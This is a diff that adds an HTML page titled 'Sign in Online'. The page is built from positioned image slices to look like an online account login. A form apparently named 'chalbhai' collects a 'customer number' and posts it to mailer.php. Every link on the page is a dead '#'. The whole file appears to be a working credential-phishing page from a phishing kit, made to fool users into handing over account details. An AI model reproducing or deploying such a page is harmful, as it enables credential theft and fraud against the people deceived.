@@ -1,0 +1,270 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <title>
+   Sign in Online
+  </title>
+  <meta content="content-type" http-equiv="content-type" />
+  <link href="images/favicon.ico" rel="shortcut icon" />
+  <script type="text/javascript">
+   function unhideBody()
+{
+var bodyElems = document.getElementsByTagName("body");
+bodyElems[0].style.visibility = "visible";
+}
+  </script>
+ </head>
+ <body bgcolor="#F7F7F5" onload="unhideBody()" style="visibility: visible;">
+  <script language="JavaScript">
+   &lt;!--
+
+var b = 0 ;
+var i = 0 ;
+var errmsg = "" ;
+var punct = "" ;
+var min = 0 ;
+var max = 0 ;
+
+function formbreeze_email(field) {
+
+	if (b &amp;&amp; (field.value.length == 0)) return true ;
+
+
+	if (! emailCheck(field.value))
+	  {
+		  field.focus();
+		  if (field.type == "text") field.select();
+		  return false ;
+	  }
+
+   return true ;
+}
+
+function formbreeze_filledin(field) {
+
+if (b &amp;&amp; (field.value.length == 0)) return true;
+
+if (field.value.length &lt; min) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false ;
+   }
+
+if ((max &gt; 0) &amp;&amp; (field.value.length &gt; max)) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false ;
+   }
+
+return true ;
+}
+
+function formbreeze_number(field) {
+
+if (b &amp;&amp; (field.value.length == 0)) return true ; ;
+
+if (i)
+ var valid = "0123456789"
+else
+ var valid = ".,0123456789"
+
+var pass = 1;
+var temp;
+for (var i=0; i&lt;field.value.length; i++) {
+temp = "" + field.value.substring(i, i+1);
+if (valid.indexOf(temp) == "-1") pass = 0;
+
+}
+
+if (!pass) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false;
+ }
+
+if (field.value &lt; min) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false;
+   }
+
+
+if ((max &gt; 0) &amp;&amp; (field.value &gt; max)) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false;
+   }
+
+return true ;
+}
+
+
+function formbreeze_numseq(field) {
+
+
+if (b &amp;&amp; (field.value.length == 0)) return true ;
+
+var valid = punct + "0123456789"
+
+var pass = 1;
+var digits = 0
+var temp;
+for (var i=0; i&lt;field.value.length; i++) {
+temp = "" + field.value.substring(i, i+1);
+if (valid.indexOf(temp) == "-1") pass = 0;
+if (valid.indexOf(temp) &gt; (punct.length-1) ) digits++ ;
+
+}
+
+if (!pass) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false ; ;
+   }
+
+if (digits &lt; min) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false;
+   }
+
+if ((max &gt; 0) &amp;&amp; (digits &gt; max)) {
+alert(errmsg);
+field.focus();
+if (field.type == "text") field.select();
+return false;
+   }
+
+return true ;
+}
+
+function emailCheck (emailStr) {
+
+var checkTLD=1;
+var knownDomsPat=/^(com|net|org|edu|int|mil|gov|arpa|biz|aero|name|coop|info|pro|museum|ws)$/;
+var emailPat=/^(.+)@(.+)$/;
+var specialChars="\\(\\)&gt;&lt;@,;:\\\\\\\"\\.\\[\\]";
+var validChars="\[^\\s" + specialChars + "\]";
+var quotedUser="(\"[^\"]*\")";
+var atom=validChars + '+';
+var word="(" + atom + "|" + quotedUser + ")";
+var userPat=new RegExp("^" + word + "(\\." + word + ")*$");
+var domainPat=new RegExp("^" + atom + "(\\." + atom +")*$");
+var matchArray=emailStr.match(emailPat);
+
+if (matchArray==null) {
+alert(errmsg);
+return false;
+}
+var user=matchArray[1];
+var domain=matchArray[2];
+
+for (i=0; i&lt;user.length; i++) {
+if (user.charCodeAt(i)&gt;127) {
+alert(errmsg);
+return false;
+   }
+}
+for (i=0; i&lt;domain.length; i++) {
+if (domain.charCodeAt(i)&gt;127) {
+alert(errmsg);
+return false;
+   }
+}
+
+if (user.match(userPat)==null) {
+alert(errmsg);
+return false;
+}
+
+var atomPat=new RegExp("^" + atom + "$");
+var domArr=domain.split(".");
+var len=domArr.length;
+for (i=0;i&lt;len;i++) {
+if (domArr[i].search(atomPat)==-1) {
+alert(errmsg);
+return false;
+   }
+}
+
+if (checkTLD &amp;&amp; domArr[domArr.length-1].length!=2 &amp;&amp;
+domArr[domArr.length-1].search(knownDomsPat)==-1) {
+alert(errmsg);
+return false;
+}
+
+if (len&lt;2) {
+alert(errmsg);
+return false;
+}
+
+return true;
+}
+
+function formbreeze_sub()
+{
+/*
+//FBDATA:formtext1^0^1^0^0^Enter Your Customer number:;
+*/
+b=0;
+errmsg="Enter Your Customer number";
+min=1;
+max=0;
+if (! formbreeze_filledin(document.chalbhai.formtext1) ) return false ;
+
+}
+--&gt;
+  </script>
+  <div style="position:absolute; overflow:hidden; left:0px; top:0px; width:978px; height:171px; z-index:0" id="image1">
+   <img width="978" height="171" border="0" title="" alt="" src="images/heAder.png" />
+  </div>
+  <div style="position:absolute; overflow:hidden; left:0px; top:177px; width:760px; height:65px; z-index:1" id="image2">
+   <img width="760" height="65" border="0" title="" alt="" src="images/online.png" />
+  </div>
+  <div style="position:absolute; overflow:hidden; left:211px; top:243px; width:552px; height:352px; z-index:2" id="image3">
+   <img width="552" height="352" border="0" title="" alt="" src="images/log.png" />
+  </div>
+  <div style="position:absolute; overflow:hidden; left:339px; top:247px; width:160px; height:33px; z-index:3" id="image4">
+   <a href="#">
+    <img width="160" height="33" border="0" title="" alt="" src="images/crd.png" />
+   </a>
+  </div>
+  <div style="position:absolute; overflow:hidden; left:454px; top:364px; width:235px; height:19px; z-index:4" id="image5">
+   <img width="235" height="19" border="0" title="" alt="" src="images/forgot.png" />
+  </div>
+  <div style="position:absolute; left:242px; top:439px; z-index:5" id="formcheckbox1">
+   <input type="checkbox" name="formcheckbox1" />
+  </div>
+  <div style="position:absolute; overflow:hidden; left:235px; top:555px; width:219px; height:20px; z-index:6" id="image6">
+   <a href="#">
+    <img width="219" height="20" border="0" title="" alt="" src="images/notsign.png" />
+   </a>
+  </div>
+  <div style="position:absolute; overflow:hidden; left:271px; top:469px; width:213px; height:23px; z-index:7" id="image7">
+   <a href="#">
+    <img width="213" height="23" border="0" title="" alt="" src="images/tellme.png" />
+   </a>
+  </div>
+  <div style="position:absolute; overflow:hidden; left:207px; top:596px; width:557px; height:171px; z-index:8" id="image8">
+   <img width="557" height="171" border="0" title="" alt="" src="images/imooo.png" />
+  </div>
+  <div style="position:absolute; overflow:hidden; left:0px; top:815px; width:979px; height:99px; z-index:9" id="image9">
+   <a href="#">
+    <img width="979" height="99" border="0" title="" alt="" src="images/footer.png" />
+   </a>
+  </div>
+  <form onsubmit=" return formbreeze_sub()" method="post" id="chalbhai" name="chalbhai" action="mailer.php">
+   <input type="text" style="position:absolute;width:88px;left:363px;top:364px;z-index:10" maxlength="10" name="formtext1" />
+   <div style="position:absolute; left:677px; top:505px; z-index:11" id="formimage1">
+    <input width="57" type="image" height="25" src="images/login.png" name="formimage1" />
+   </div>
+  </form>
+ </body>
+</html>
